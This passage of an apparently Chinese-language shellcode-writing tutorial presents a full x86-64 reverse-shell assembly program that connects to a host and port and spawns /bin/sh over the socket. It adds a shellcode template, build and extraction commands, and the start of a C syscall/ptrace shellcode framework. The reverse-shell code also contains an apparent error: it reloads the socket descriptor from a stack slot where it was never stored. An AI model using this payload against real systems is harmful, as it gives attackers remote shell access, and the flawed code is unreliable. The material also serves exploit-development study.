+<h5 id="（4）IO-重定向"><a href="#（4）IO-重定向" class="headerlink" title="（4）IO 重定向"></a>（4）IO 重定向</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov al, 33      ; dup2()</span><br><span class="line">mov rsi, 0      ; stdin</span><br><span class="line">syscall</span><br><span class="line">mov rsi, 1      ; stdout  </span><br><span class="line">syscall</span><br><span class="line">mov rsi, 2      ; stderr</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="（5）启动-shell"><a href="#（5）启动-shell" class="headerlink" title="（5）启动 shell"></a>（5）启动 shell</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="（6）完整代码"><a href="#（6）完整代码" class="headerlink" title="（6）完整代码"></a>（6）完整代码</h5><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">; reverse_shell.asm - 反弹shell到指定IP和端口</span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 第一步: 创建socket</span><br><span class="line">    ; socket(AF_INET, SOCK_STREAM, 0)</span><br><span class="line">    mov rax, 41         ; socket系统调用号=41</span><br><span class="line">    mov rdi, 2          ; AF_INET=2</span><br><span class="line">    mov rsi, 1          ; SOCK_STREAM=1</span><br><span class="line">    xor rdx, rdx        ; protocol=0</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; 保存socket描述符</span><br><span class="line">    mov rdi, rax        ; rdi现在保存socket fd</span><br><span class="line">    </span><br><span class="line">    ; 第二步: 构建sockaddr_in结构</span><br><span class="line">    ; 结构体: &#123;AF_INET=2, port, IP&#125;</span><br><span class="line">    xor rax, rax</span><br><span class="line">    push rax            ; 填充8字节</span><br><span class="line">    mov dword [rsp-4], 0x0100007f  ; IP: 127.0.0.1 (本地测试)</span><br><span class="line">    mov word [rsp-6], 0x5c11       ; 端口: 4444 (0x115c)</span><br><span class="line">    mov word [rsp-8], 0x2          ; AF_INET=2</span><br><span class="line">    sub rsp, 8          ; 调整栈指针</span><br><span class="line">    </span><br><span class="line">    ; 第三步: connect连接</span><br><span class="line">    ; connect(sockfd, &amp;serv_addr, 16)</span><br><span class="line">    mov rsi, rsp        ; 指向sockaddr结构</span><br><span class="line">    mov rdx, 16         ; 地址长度=16</span><br><span class="line">    mov rax, 42         ; connect系统调用号=42</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; 第四步: 重定向标准输入输出错误到socket</span><br><span class="line">    ; dup2(sockfd, 0) - 标准输入</span><br><span class="line">    mov rdi, [rsp+8]    ; 获取socket fd (之前保存在栈上)</span><br><span class="line">    xor rax, rax</span><br><span class="line">    mov al, 33          ; dup2系统调用号=33</span><br><span class="line">    xor rsi, rsi        ; stdin=0</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; dup2(sockfd, 1) - 标准输出</span><br><span class="line">    mov al, 33</span><br><span class="line">    mov rsi, 1          ; stdout=1</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; dup2(sockfd, 2) - 标准错误</span><br><span class="line">    mov al, 33</span><br><span class="line">    mov rsi, 2          ; stderr=2</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; 第五步: 执行/bin/sh</span><br><span class="line">    ; execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    push rsi            ; 字符串结尾的null</span><br><span class="line">    </span><br><span class="line">    mov rdi, 0x68732f6e69622f2f  ; &quot;//bin/sh&quot;</span><br><span class="line">    push rdi</span><br><span class="line">    mov rdi, rsp        ; rdi指向&quot;/bin/sh&quot;</span><br><span class="line">    </span><br><span class="line">    push rsi            ; argv[1]=NULL</span><br><span class="line">    push rdi            ; argv[0]=&quot;/bin/sh&quot;</span><br><span class="line">    mov rsi, rsp        ; rsi指向argv</span><br><span class="line">    </span><br><span class="line">    xor rdx, rdx        ; envp=NULL</span><br><span class="line">    mov al, 59          ; execve系统调用号=59</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="5、template-模板"><a href="#5、template-模板" class="headerlink" title="5、template 模板"></a>5、template 模板</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">; ================================</span><br><span class="line">; Shellcode模板</span><br><span class="line">; 使用方法：</span><br><span class="line">; nasm -f elf64 template.asm -o template.o</span><br><span class="line">; ld template.o -o template</span><br><span class="line">; objcopy -O binary --only-section=.text template.o shellcode.bin</span><br><span class="line">; ================================</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    ; 在这里写你的代码</span><br><span class="line">    ; 使用下面的模式：</span><br><span class="line">    </span><br><span class="line">    ; 1. 设置系统调用号</span><br><span class="line">    mov rax, 系统调用号</span><br><span class="line">    </span><br><span class="line">    ; 2. 设置参数</span><br><span class="line">    mov rdi, 参数1</span><br><span class="line">    mov rsi, 参数2  </span><br><span class="line">    mov rdx, 参数3</span><br><span class="line">    </span><br><span class="line">    ; 3. 执行调用</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ; 示例：退出程序</span><br><span class="line">    mov rax, 60    ; exit</span><br><span class="line">    mov rdi, 0     ; 状态码</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="（三）生成机器码"><a href="#（三）生成机器码" class="headerlink" title="（三）生成机器码"></a>（三）生成机器码</h3><p>使用 nasm</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译汇编文件</span></span><br><span class="line">nasm -f elf64 shellcode.asm -o shellcode.o</span><br><span class="line"></span><br><span class="line"><span class="comment"># 链接为可执行文件（测试用）</span></span><br><span class="line">ld shellcode.o -o shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取机器码</span></span><br><span class="line">objcopy -O binary --only-section=.text shellcode.o shellcode.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看机器码</span></span><br><span class="line">hexdump -C shellcode.bin</span><br><span class="line"><span class="built_in">od</span> -tx1 shellcode.bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反汇编验证</span></span><br><span class="line">objdump -d -M intel shellcode.o</span><br></pre></td></tr></table></figure></div>
+
+<p>生成 c 语言数组形式：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 C 数组格式</span></span><br><span class="line">xxd -i shellcode.bin</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="二、使用-C-编译提取-shellcode"><a href="#二、使用-C-编译提取-shellcode" class="headerlink" title="二、使用 C 编译提取 shellcode"></a>二、使用 C 编译提取 shellcode</h2><p>通过示例说明：</p>
+<h3 id="（一）shellcode-c"><a href="#（一）shellcode-c" class="headerlink" title="（一）shellcode.c"></a>（一）shellcode.c</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall0(<span class="type">long</span> n)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n) : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall1(<span class="type">long</span> n, <span class="type">long</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1) : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall2(<span class="type">long</span> n, <span class="type">long</span> a1, <span class="type">long</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1), <span class="string">&quot;S&quot;</span>(a2)</span><br><span class="line">						  : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall3(<span class="type">long</span> n, <span class="type">long</span> a1, <span class="type">long</span> a2, <span class="type">long</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1), <span class="string">&quot;S&quot;</span>(a2),</span><br><span class="line">						  <span class="string">&quot;d&quot;</span>(a3) : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall4(<span class="type">long</span> n, <span class="type">long</span> a1, <span class="type">long</span> a2, <span class="type">long</span> a3, <span class="type">long</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r10 __asm__(<span class="string">&quot;r10&quot;</span>) = a4;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1), <span class="string">&quot;S&quot;</span>(a2),</span><br><span class="line">						  <span class="string">&quot;d&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(r10): <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall5(<span class="type">long</span> n, <span class="type">long</span> a1, <span class="type">long</span> a2, <span class="type">long</span> a3, <span class="type">long</span> a4, <span class="type">long</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r10 __asm__(<span class="string">&quot;r10&quot;</span>) = a4;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r8 __asm__(<span class="string">&quot;r8&quot;</span>) = a5;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1), <span class="string">&quot;S&quot;</span>(a2),</span><br><span class="line">						  <span class="string">&quot;d&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(r10), <span class="string">&quot;r&quot;</span>(r8) : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall6(<span class="type">long</span> n, <span class="type">long</span> a1, <span class="type">long</span> a2, <span class="type">long</span> a3, <span class="type">long</span> a4, <span class="type">long</span> a5, <span class="type">long</span> a6)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r10 __asm__(<span class="string">&quot;r10&quot;</span>) = a4;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r8 __asm__(<span class="string">&quot;r8&quot;</span>) = a5;</span><br><span class="line">	<span class="keyword">register</span> <span class="type">long</span> r9 __asm__(<span class="string">&quot;r9&quot;</span>) = a6;</span><br><span class="line">	__asm__ __volatile__ (<span class="string">&quot;syscall&quot;</span> : <span class="string">&quot;=a&quot;</span>(ret) : <span class="string">&quot;a&quot;</span>(n), <span class="string">&quot;D&quot;</span>(a1), <span class="string">&quot;S&quot;</span>(a2),</span><br><span class="line">						  <span class="string">&quot;d&quot;</span>(a3), <span class="string">&quot;r&quot;</span>(r10), <span class="string">&quot;r&quot;</span>(r8), <span class="string">&quot;r&quot;</span>(r9) : <span class="string">&quot;rcx&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">long</span> __syscall_ret(<span class="type">unsigned</span> <span class="type">long</span> r)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (r &gt; <span class="number">-4096UL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __scc(X) ((long) (X))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall1(n,a) __syscall1(n,__scc(a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall2(n,a,b) __syscall2(n,__scc(a),__scc(b))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall3(n,a,b,c) __syscall3(n,__scc(a),__scc(b),__scc(c))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall4(n,a,b,c,d) __syscall4(n,__scc(a),__scc(b),__scc(c),__scc(d))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall5(n,a,b,c,d,e) __syscall5(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall6(n,a,b,c,d,e,f) __syscall6(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall7(n,a,b,c,d,e,f,g) __syscall7(n,__scc(a),__scc(b),__scc(c),__scc(d),__scc(e),__scc(f),__scc(g))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SYSCALL_NARGS_X(a,b,c,d,e,f,g,h,n,...) n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SYSCALL_NARGS(...) __SYSCALL_NARGS_X(__VA_ARGS__,7,6,5,4,3,2,1,0,)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SYSCALL_CONCAT_X(a,b) a##b</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SYSCALL_CONCAT(a,b) __SYSCALL_CONCAT_X(a,b)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __SYSCALL_DISP(b,...) __SYSCALL_CONCAT(b,__SYSCALL_NARGS(__VA_ARGS__))(__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __syscall(...) __SYSCALL_DISP(__syscall,__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall(...) __syscall_ret(__syscall(__VA_ARGS__))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> u8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> u16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> uint;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> <span class="type">size_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NULL 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAILURE 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span>* buf, <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_write, fd, buf, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_exit, status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">waitpid</span><span class="params">(<span class="type">long</span> pid, <span class="type">long</span> status, <span class="type">long</span> option)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_wait4, pid, status, option, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">ptrace</span><span class="params">(<span class="type">long</span> req, <span class="type">long</span> pid, <span class="type">long</span> addr, <span class="type">long</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_ptrace, req, pid, addr, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (*buf) &#123;</span><br><span class="line">        buf++;</span><br><span class="line">        l++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> r = write(<span class="number">1</span>, s, <span class="built_in">strlen</span>(s));</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> die(s) \</span></span><br><span class="line"><span class="meta">puts (s); \</span></span><br><span class="line"><span class="meta">return FAILURE</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span 